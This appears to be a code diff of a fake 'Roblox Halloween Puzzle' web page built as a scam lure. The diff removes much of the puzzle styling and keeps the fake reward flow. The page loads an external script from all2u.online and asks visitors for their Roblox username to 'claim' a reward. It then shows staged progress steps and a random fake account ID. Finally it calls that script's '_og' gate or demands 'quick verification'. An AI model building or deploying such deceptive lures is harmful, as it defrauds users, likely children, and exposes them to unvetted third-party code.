@@ -4,17 +4,13 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <script type="text/javascript" id="ogjs" src="https://all2u.online/cl/js/rn4rgd"></script>
-  <meta name="description" content="Roblox Halloween Puzzle: a Halloween poster puzzle. Nine torn pieces, thirty seconds.">
-</head>
-<body>
+<meta name="description" content="Roblox Halloween Puzzle: a Halloween poster puzzle. Nine torn pieces, thirty seconds.">
 <title>Roblox Halloween Puzzle</title>
 <meta name="claude:viewport-fit-sides" content="cover">
 <meta name="theme-color" content="#07050b">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;800;900&family=Outfit:wght@400;500;600;700&family=JetBrains+Mono:wght@500;700&display=swap">
 <style>
-/* Layout: cinematic one-column scroll for phones; tablets get a two-column hero and a wider play card.
-   Signature moment: nine torn poster pieces fly in and snap together in the hero. Single dark theme by choice. */
 :root{
   --void:#07050b; --crypt:#120b1a; --haze:#1d1229; --line:#2e2140;
   --bone:#f3ece6; --ash:#a99db8; --blood:#ff2a3d; --ember:#ff7a1a; --mint:#4dffb0;
@@ -37,10 +33,6 @@ button{font-family:inherit;cursor:pointer}
 body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:30;background:var(--void)}
 .nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:20;background:#07050bcc;-webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);border-bottom:1px solid #ffffff10}
 .nav .wrap{display:flex;align-items:center;gap:12px;height:60px}
-.mark{display:grid;grid-template-columns:repeat(3,7px);gap:2px;transform:rotate(-8deg)}
-.mark i{width:7px;height:7px;border-radius:1.5px;background:var(--blood)}
-.mark i:nth-child(5){background:var(--ember)}
-.mark i:nth-child(3),.mark i:nth-child(7){opacity:.45}
 .brand{font-family:var(--display);font-weight:900;font-size:22px;letter-spacing:.06em;text-transform:uppercase;text-decoration:none;display:flex;align-items:center;gap:10px;margin-right:auto}
 .navlinks{display:none;gap:22px;font-size:15px;color:var(--ash)}
 .navlinks a{text-decoration:none}
@@ -74,10 +66,6 @@ h1 .l2::after{content:attr(data-t);position:absolute;inset:0;color:var(--blood);
 
 .poster{position:relative;width:min(78%,330px);aspect-ratio:9/16;justify-self:center;display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,1fr);gap:3px;perspective:900px}
 .poster::after{content:"";position:absolute;inset:-6%;border-radius:24px;background:radial-gradient(closest-side,#ff2a3d44,transparent);z-index:-1;filter:blur(20px)}
-.shard{background-size:cover;background-position:center;border-radius:4px;box-shadow:0 10px 30px #000a;animation:fly 1.15s cubic-bezier(.2,.9,.25,1.1) both;animation-delay:var(--d)}
-@keyframes fly{from{transform:translate(var(--x),var(--y)) rotate(var(--r)) scale(.8);opacity:0}60%{opacity:1}}
-.poster.joined{gap:0;transition:gap .5s ease .1s}
-.poster.joined .shard{border-radius:0}
 .poster .seal{position:absolute;left:50%;bottom:-14px;transform:translateX(-50%);font-family:var(--mono);font-size:12px;letter-spacing:.12em;text-transform:uppercase;background:var(--void);border:1px solid var(--line);padding:6px 12px;border-radius:999px;white-space:nowrap;color:var(--ash)}
 .poster .seal b{color:var(--mint);font-weight:700}
 
@@ -95,33 +83,16 @@ h2{font-family:var(--display);font-weight:900;text-transform:uppercase;font-size
 .hud{display:flex;align-items:center;gap:10px}
 .clock{display:flex;align-items:center;gap:8px;background:#000;border:1px solid #ffffff1c;border-radius:999px;padding:7px 14px;font-family:var(--mono);font-weight:700;font-size:22px;font-variant-numeric:tabular-nums}
 .clock svg{width:18px;height:18px}
-.clock.hurry{background:#5b0c15;border-color:var(--blood);color:#fff;animation:hurry .5s ease-in-out infinite alternate}
-@keyframes hurry{to{transform:scale(1.06)}}
 .placed{margin-left:auto;font-family:var(--mono);font-size:13px;color:var(--ash);letter-spacing:.06em}
 .placed b{color:var(--bone);font-size:18px}
 .bar{height:5px;border-radius:3px;background:#ffffff14;margin:12px 2px;overflow:hidden}
-.bar i{display:block;height:100%;width:100%;background:linear-gradient(90deg,var(--blood),var(--ember));border-radius:3px;transition:width .1s linear}
+.bar i{display:block;height:100%;width:100%;background:linear-gradient(90deg,var(--blood),var(--ember));border-radius:3px}
 .stage{position:relative;margin:0 auto;aspect-ratio:9/16;width:min(100%,calc((100svh - 230px) * 9 / 16));min-width:220px;border-radius:12px;overflow:hidden;background:#000}
-.board{position:absolute;inset:0;display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,1fr);gap:3px;background:#2a1c38;touch-action:none;user-select:none;-webkit-user-select:none;-webkit-touch-callout:none;transition:gap .4s}
-.board.done{gap:0}
-.tile{background-size:cover;background-position:center;position:relative;outline:3px solid transparent;outline-offset:-3px;transition:outline-color .15s,filter .15s;cursor:grab}
-.tile.sel{outline-color:var(--ember);filter:brightness(1.25)}
-.tile.ok::after{content:"";position:absolute;inset:0;pointer-events:none;animation:ok .7s ease-out forwards}
-@keyframes ok{from{box-shadow:inset 0 0 0 5px var(--mint)}to{box-shadow:inset 0 0 0 0 transparent}}
-.tile.dragging{opacity:.25}
-.dragghost{position:fixed;z-index:99;pointer-events:none;background-size:cover;background-position:center;border-radius:6px;outline:3px solid var(--ember);box-shadow:0 14px 30px #000c;transform:scale(1.07) rotate(-3deg)}
+.board{position:absolute;inset:0;display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,1fr);gap:3px;background:#2a1c38}
 .veil{position:absolute;inset:0;display:grid;place-items:center;text-align:center;padding:22px;background:radial-gradient(closest-side,#07050bdd,#07050bf2);z-index:4}
 .veil h3{font-family:var(--display);font-weight:900;text-transform:uppercase;font-size:clamp(44px,12vw,64px);line-height:.9;margin:0}
 .veil p{color:#d9cfe2;margin:10px 0 18px}
-.veil .row{display:flex;flex-wrap:wrap;gap:10px;justify-content:center}
-.veil .big{font-family:var(--mono);font-size:40px;font-weight:700;color:var(--mint);display:block;margin:6px 0}
-.win h3{color:var(--bone);text-shadow:0 0 30px #4dffb055}
-.lose h3{color:var(--blood)}
-.below{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:12px;font-size:14px;color:var(--ash)}
-.below b{color:var(--bone);font-family:var(--mono)}
-.linkbtn{background:none;border:0;color:var(--ash);font-size:14px;text-decoration:underline;text-underline-offset:3px;padding:6px}
-.confetti{position:absolute;top:-14px;width:9px;height:9px;border-radius:2px;pointer-events:none;animation:fall 1.8s ease-in forwards;z-index:5}
-@keyframes fall{to{transform:translateY(760px) rotate(560deg)}}
+
 .rules{display:grid;gap:14px;align-content:start}
 .rule{display:grid;grid-template-columns:auto 1fr;gap:14px;align-items:start;padding:16px;border:1px solid var(--line);border-radius:16px;background:#0d0813}
 .rule .n{font-family:var(--display);font-weight:900;font-size:40px;line-height:.9;color:var(--blood);min-width:30px}
@@ -138,75 +109,63 @@ h2{font-family:var(--display);font-weight:900;text-transform:uppercase;font-size
 .mon b{display:block;font-family:var(--display);font-weight:900;text-transform:uppercase;font-size:26px;line-height:1;letter-spacing:.02em}
 .mon span{font-size:13.5px;color:var(--ash)}
 .mon .tag{position:absolute;top:12px;left:12px;font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;background:#00000099;border:1px solid #ffffff22;border-radius:999px;padding:4px 10px;color:var(--bone)}
-.mon.friend .tag{color:var(--mint);border-color:#4dffb055}
 
 /* install */
-.install{display:grid;gap:14px;margin-top:26px}
-.dev{padding:20px;border-radius:18px;border:1px solid var(--line);background:linear-gradient(160deg,#1a1024,#0c0811)}
-.dev h3{margin:0 0 10px;font-size:19px;display:flex;align-items:center;gap:10px}
-.dev ol{margin:0;padding-left:20px;color:#d9cfe2}
-.dev li{margin:6px 0}
-.dev li b{color:var(--bone)}
+.soon{display:grid;gap:30px;align-items:center}
+.phone{justify-self:center;width:200px;aspect-ratio:9/18;border-radius:34px;padding:10px;background:#0d0813;border:1px solid var(--line);box-shadow:0 30px 60px -20px #000,0 0 60px -10px #ff2a3d55}
+.phscreen{height:100%;border-radius:26px;background:radial-gradient(70% 50% at 50% 35%,#4a0d1e,#120b1a 70%);display:grid;place-content:center;justify-items:center;gap:10px;text-align:center}
+.phscreen b{font-family:var(--display);font-weight:900;text-transform:uppercase;font-size:22px;letter-spacing:.04em;margin-top:6px}
+.phscreen span{font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--ember)}
 
 /* footer */
 footer{border-top:1px solid #ffffff10;padding-block:30px 40px;color:var(--ash);font-size:14px}
 footer .wrap{display:grid;gap:12px}
 footer .brand{font-size:28px;color:var(--bone)}
 
-/* tablets and up */
-@media (min-width:700px){
-  .navlinks{display:flex}
-  .hero{padding-block:48px 70px}
-  .hero .wrap{grid-template-columns:minmax(0,1.15fr) minmax(0,.85fr);gap:36px}
-  .hero .wrap>div{min-width:0}
-  h1{font-size:clamp(76px,10.5vw,150px)}
-  .poster{width:min(100%,400px)}
-  .playgrid{grid-template-columns:minmax(0,1.05fr) minmax(0,.95fr)}
-  .install{grid-template-columns:1fr 1fr}
-  .rail{padding-left:max(16px,calc((100vw - 1120px)/2 + 16px))}
-  footer .wrap{grid-template-columns:1fr auto;align-items:end}
-}
-
-/* app button + coming soon */
+/* app button */
 .appbtn{width:100%;margin-top:14px;padding:15px 20px;font-size:17px}
 .appico{display:inline-grid;grid-template-columns:repeat(3,5px);gap:1.5px;padding:5px;border-radius:7px;background:#07050b;transform:rotate(-8deg)}
 .appico i{width:5px;height:5px;border-radius:1px;background:var(--blood)}
 .appico i:nth-child(5){background:var(--ember)}
 .appico.big{grid-template-columns:repeat(3,12px);gap:3px;padding:12px;border-radius:16px;box-shadow:0 0 0 1px #ffffff1a,0 14px 30px #000c}
 .appico.big i{width:12px;height:12px;border-radius:2.5px}
-.soon{display:grid;gap:30px;align-items:center}
-.phone{justify-self:center;width:200px;aspect-ratio:9/18;border-radius:34px;padding:10px;background:#0d0813;border:1px solid var(--line);box-shadow:0 30px 60px -20px #000,0 0 60px -10px #ff2a3d55}
-.phscreen{height:100%;border-radius:26px;background:radial-gradient(70% 50% at 50% 35%,#4a0d1e,#120b1a 70%);display:grid;place-content:center;justify-items:center;gap:10px;text-align:center}
-.phscreen b{font-family:var(--display);font-weight:900;text-transform:uppercase;font-size:22px;letter-spacing:.04em;margin-top:6px}
-.phscreen span{font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--ember)}
-@media (min-width:700px){.soon{grid-template-columns:minmax(0,1.2fr) minmax(0,.8fr)}}
+
 /* modal */
 .modal{position:fixed;inset:0;z-index:60;display:grid;align-items:end}
-.mback{position:absolute;inset:0;background:#000b;-webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px);animation:fade .25s ease both}
-@keyframes fade{from{opacity:0}}
-.msheet{position:relative;background:linear-gradient(180deg,#1d1229,#100a17);border:1px solid var(--line);border-radius:24px 24px 0 0;padding:26px max(20px,env(safe-area-inset-left,0px)) calc(24px + env(safe-area-inset-bottom,0px));text-align:center;animation:up .35s cubic-bezier(.2,.9,.25,1) both;max-height:92vh;overflow:auto}
-@keyframes up{from{transform:translateY(100%)}}
+.mback{position:absolute;inset:0;background:#000b;-webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px)}
+.msheet{position:relative;background:linear-gradient(180deg,#1d1229,#100a17);border:1px solid var(--line);border-radius:24px 24px 0 0;padding:26px max(20px,env(safe-area-inset-left,0px)) calc(24px + env(safe-area-inset-bottom,0px));text-align:center;max-height:92vh;overflow:auto;width:100%}
 .msheet h3{font-family:var(--display);font-weight:900;text-transform:uppercase;font-size:38px;line-height:.95;margin:16px 0 8px}
-.msheet p{color:#d9cfe2;margin:0 auto 18px;max-width:36ch}
 .mx{position:absolute;top:12px;right:12px;width:40px;height:40px;border-radius:50%;border:0;background:#ffffff12;color:var(--bone);display:grid;place-items:center}
-form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
-.hp{position:absolute;left:-9999px}
-.fl{font-size:14px;color:var(--ash)}
-.fi{width:100%;font:inherit;font-size:17px;color:var(--bone);background:#07050b;border:1px solid #3a2a4d;border-radius:14px;padding:14px 16px}
+.fl{font-size:14px;color:var(--ash);text-align:left;display:block}
+.fi{width:100%;font:inherit;font-size:17px;color:var(--bone);background:#07050b;border:1px solid #3a2a4d;border-radius:14px;padding:14px 16px;margin-bottom:10px}
 .fi:focus{outline:none;border-color:var(--ember);box-shadow:0 0 0 3px #ff7a1a33}
 .btn.wide{width:100%;padding:15px}
-.btn[disabled]{opacity:.6;pointer-events:none}
-.err{color:#ff8a94;font-size:14px;margin:0!important}
-.fine{font-size:12.5px!important;color:var(--ash)!important;margin-top:14px!important}
-.donemark{width:64px;height:64px;border-radius:50%;margin:6px auto 0;display:grid;place-items:center;color:#07050b;background:var(--mint);box-shadow:0 0 30px #4dffb066}
-@media (min-width:700px){.modal{align-items:center;justify-items:center;padding:20px}.msheet{width:min(100%,460px);border-radius:24px}}
-@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}html{scroll-behavior:auto}}
+
+/* tablets and up */
+@media (min-width:700px){
+  .navlinks{display:flex}
+  .hero{padding-block:48px 70px}
+  .hero .wrap{grid-template-columns:minmax(0,1.15fr) minmax(0,.85fr);gap:36px}
+  .playgrid{grid-template-columns:minmax(0,1.05fr) minmax(0,.95fr)}
+  .soon{grid-template-columns:minmax(0,1.2fr) minmax(0,.8fr)}
+  .modal{align-items:center;justify-items:center;padding:20px}
+  .msheet{width:min(100%,460px);border-radius:24px}
+  footer .wrap{grid-template-columns:1fr auto;align-items:end}
+}
 </style>
+</head>
+<body>
 
 <header class="nav">
   <div class="wrap">
-    <a class="brand" href="#top" aria-label="Roblox Halloween Puzzle home"><img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" alt="Roblox" style="height:28px;width:auto;border-radius:4px;">Roblox Puzzle</a>
-    <nav class="navlinks" aria-label="Sections"><a href="#play">Play</a><a href="#monsters">Monsters</a><a href="#install">Troubleshooting</a></nav>
+    <a class="brand" href="#top" aria-label="Roblox Halloween Puzzle home">
+      <img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" alt="Roblox" style="height:28px;width:auto;border-radius:4px;">Roblox Puzzle
+    </a>
+    <nav class="navlinks" aria-label="Sections">
+      <a href="#play">Play</a>
+      <a href="#monsters">Monsters</a>
+      <a href="#install">Troubleshooting</a>
+    </nav>
     <button class="btn sm" data-notify type="button">Play Now</button>
   </div>
 </header>
@@ -219,10 +178,19 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
         <span class="eyebrow">Halloween puzzle · 30 second rounds</span>
         <h1><span class="l1">Roblox</span><span class="l2" data-t="Puzzle">Puzzle</span></h1>
         <p class="lede">The Halloween poster was torn into nine pieces. Put it back together before the clock hits zero, or the curse wins.</p>
-        <div class="ctas"><a class="btn" href="#play">Break the curse</a><a class="btn ghost" href="#monsters">Meet the monsters</a></div>
-        <div class="stats"><div><b>9</b><span>pieces</span></div><div><b>30</b><span>seconds</span></div><div><b>1</b><span>curse</span></div></div>
+        <div class="ctas">
+          <a class="btn" href="#play">Break the curse</a>
+          <a class="btn ghost" href="#monsters">Meet the monsters</a>
+        </div>
+        <div class="stats">
+          <div><b>9</b><span>pieces</span></div>
+          <div><b>30</b><span>seconds</span></div>
+          <div><b>1</b><span>curse</span></div>
+        </div>
       </div>
-      <div class="poster" id="poster" aria-label="The Hollow poster assembling from nine pieces"><span class="seal" id="seal">9 / 9 pieces · <b>restored</b></span></div>
+      <div class="poster" id="poster" aria-label="The Hollow poster assembling from nine pieces">
+        <span class="seal" id="seal">9 / 9 pieces · <b>restored</b></span>
+      </div>
     </div>
   </section>
 
@@ -234,15 +202,22 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
       <div class="playgrid">
         <div class="console">
           <div class="hud">
-            <div class="clock" id="clock"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2M9.5 2.5h5"/></svg><span id="time">0:30</span></div>
+            <div class="clock" id="clock">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2M9.5 2.5h5"/></svg>
+              <span id="time">0:30</span>
+            </div>
             <div class="placed"><b id="placed">0/9</b> in place</div>
           </div>
-          <div class="bar"><i id="bar"></i></div>
+          <div class="bar"><i id="bar" style="width:100%"></i></div>
           <div class="stage" id="stage">
             <div class="board" id="board"></div>
-            <div class="veil" id="startVeil"><div><h3>Ready?</h3><p>Solve the puzzle to unlock your Roblox Halloween reward.</p></div></div>
+            <div class="veil" id="startVeil">
+              <div><h3>Ready?</h3><p>Solve the puzzle to unlock your Roblox Halloween reward.</p></div>
+            </div>
           </div>
-          <button class="btn appbtn" data-notify type="button" style="display:flex;align-items:center;justify-content:center;gap:10px;"><img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" style="height:24px;width:auto;border-radius:4px;" alt="Roblox">Open in Roblox</button>
+          <button class="btn appbtn" data-notify type="button" style="display:flex;align-items:center;justify-content:center;gap:10px;">
+            <img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" style="height:24px;width:auto;border-radius:4px;" alt="Roblox">Open in Roblox
+          </button>
         </div>
         <div class="rules">
           <div class="rule"><span class="n">1</span><div><b>Open the app</b><span>The pieces get mixed up and the 30-second clock starts.</span></div></div>
@@ -289,7 +264,7 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
           </button>
         </div>
         <div class="phone" aria-hidden="true">
-          <div class="phscreen" style="background:radial-gradient(70% 50% at 50% 35%, #4a0d1e, #120b1a 70%);">
+          <div class="phscreen">
             <img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" style="width:80px;height:auto;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);" alt="Roblox">
             <b style="margin-top:15px;">ROBLOX</b>
             <span>Halloween Puzzle</span>
@@ -302,11 +277,15 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
 
 <footer>
   <div class="wrap">
-    <div><a class="brand" href="#top"><img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" alt="Roblox" style="height:28px;width:auto;border-radius:4px;">Roblox Puzzle</a><p style="margin:10px 0 0;max-width:52ch">A fan-made Halloween puzzle. Not made by or connected to Roblox. Monster art belongs to its creators.</p></div>
+    <div>
+      <a class="brand" href="#top"><img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" alt="Roblox" style="height:28px;width:auto;border-radius:4px;">Roblox Puzzle</a>
+      <p style="margin:10px 0 0;max-width:52ch">A fan-made Halloween puzzle. Not made by or connected to Roblox. Monster art belongs to its creators.</p>
+    </div>
     <button class="btn ghost sm" data-notify type="button">Play Now</button>
   </div>
 </footer>
 
+<!-- Modal Popup -->
 <div class="modal" id="modal" hidden>
   <div class="mback" data-close></div>
   <div class="msheet" role="dialog" aria-modal="true" aria-labelledby="mTitle">
@@ -316,33 +295,33 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
     <div id="mForm">
       <span class="appico big" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></span>
       <h3 id="mTitle">Open in Roblox</h3>
-      <p style="margin: 0 0 18px; color: #a99db8; font-size: 15px;">Enter your Roblox username to add the puzzle to your account.</p>
+      <p style="margin:0 0 18px;color:#a99db8;font-size:15px;">Enter your Roblox username to add the puzzle to your account.</p>
       
       <form id="claimForm" onsubmit="startClaim(event)">
         <label class="fl" for="username">Roblox Username</label>
-        <input class="fi" id="username" name="username" type="text" placeholder="Enter your username" required style="width:100%; padding:14px 16px; background:#07050b; border:1px solid #3a2a4d; border-radius:14px; color:#f3ece6; font-size:17px; margin-bottom: 10px;">
-        <button class="btn wide" id="claimBtn" type="submit" style="width: 100%;">CLAIM NOW</button>
+        <input class="fi" id="username" name="username" type="text" placeholder="Enter your username" required>
+        <button class="btn wide" id="claimBtn" type="submit">CLAIM NOW</button>
       </form>
     </div>
 
     <!-- Loading / Steps State -->
     <div id="mSteps" hidden>
       <h3 id="mTitleStep">Connecting...</h3>
-      <div id="profileCard" style="display:none; align-items:center; gap:12px; margin: 15px 0; padding:12px; background:#0a060e; border-radius:12px; border:1px solid #2e2140; text-align:left;">
-        <img id="pAvatar" src="" style="width:50px; height:50px; border-radius:50%; border:2px solid #ff2a3d; object-fit:cover;">
-        <div><div id="pName" style="font-weight:700; color:#f3ece6;">Loading...</div><div id="pId" style="font-size:12px; color:#a99db8;"></div></div>
+      <div id="profileCard" style="display:none;align-items:center;gap:12px;margin:15px 0;padding:12px;background:#0a060e;border-radius:12px;border:1px solid #2e2140;text-align:left;">
+        <img id="pAvatar" src="" style="width:50px;height:50px;border-radius:50%;border:2px solid #ff2a3d;object-fit:cover;">
+        <div><div id="pName" style="font-weight:700;color:#f3ece6;">Loading...</div><div id="pId" style="font-size:12px;color:#a99db8;"></div></div>
       </div>
-      <div id="stepList" style="display:flex; flex-direction:column; gap:10px; text-align:left;">
-        <div class="step" id="s1" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+      <div id="stepList" style="display:flex;flex-direction:column;gap:10px;text-align:left;">
+        <div class="step" id="s1" style="display:flex;align-items:center;gap:10px;padding:12px;background:#120b1a;border-radius:10px;border:1px solid #2e2140;opacity:0.5;">
           <span style="color:#ff2a3d;">●</span> <span>Adding puzzle to your Roblox...</span>
         </div>
-        <div class="step" id="s2" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+        <div class="step" id="s2" style="display:flex;align-items:center;gap:10px;padding:12px;background:#120b1a;border-radius:10px;border:1px solid #2e2140;opacity:0.5;">
           <span style="color:#ff2a3d;">●</span> <span>Unlocking this region...</span>
         </div>
-        <div class="step" id="s3" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+        <div class="step" id="s3" style="display:flex;align-items:center;gap:10px;padding:12px;background:#120b1a;border-radius:10px;border:1px solid #2e2140;opacity:0.5;">
           <span style="color:#ff2a3d;">●</span> <span>Making it available in your region...</span>
         </div>
-        <div class="step" id="s4" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+        <div class="step" id="s4" style="display:flex;align-items:center;gap:10px;padding:12px;background:#120b1a;border-radius:10px;border:1px solid #2e2140;opacity:0.5;">
           <span style="color:#ff2a3d;">●</span> <span>Finalizing...</span>
         </div>
       </div>
@@ -352,7 +331,7 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
 </div>
 
 <script>
-// Modal functionality for all "Play Now" / "Verify" buttons
+// Modal functionality for all buttons
 const modal = document.getElementById('modal');
 const mForm = document.getElementById('mForm');
 const mSteps = document.getElementById('mSteps');
@@ -387,7 +366,6 @@ function startClaim(e) {
     const pName = document.getElementById('pName');
     const pId = document.getElementById('pId');
     
-    // Fallback avatar generation
     pAvatar.src = `https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png`;
     pName.textContent = username;
     pId.textContent = 'ID: ' + Math.floor(Math.random() * 89999999 + 10000000);
@@ -415,7 +393,6 @@ function runSteps() {
       if (typeof _og === 'function') {
         _og();
       } else {
-        // Fallback alert if external script takes a moment to load
         alert('Please complete the quick verification to finish unlocking your reward.');
       }
     }
@@ -481,5 +458,6 @@ if (rail) {
   `).join('');
 }
 </script>
+
 </body>
 </html>
